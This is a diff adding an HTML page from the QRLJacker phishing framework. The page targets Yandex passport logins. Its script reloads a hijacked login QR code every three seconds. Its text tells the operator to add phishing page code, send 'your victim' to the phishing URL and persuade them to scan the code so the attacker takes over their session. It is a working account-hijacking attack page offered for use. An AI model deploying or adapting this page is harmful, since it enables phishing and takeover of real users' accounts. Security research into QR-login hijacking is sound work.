@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>Yandex passport</title>
+</head>
+<body>
+<script>
+var myTimer; myTimer = window.setInterval(reloadD,3000);
+function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();}
+</script>
+<center><h1><b>QRLJacker: Yandex passport</b></h1>
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
+</br>1. This is your always updated Yandex passport QR Code
+</b><img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
+</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
+</br>3. Point your victim to your phishing <a href='http://localhost:1337'>URL</a>, Convince to scan the QR code and Bob is your uncle!
+</center>
+</body>
+</html>
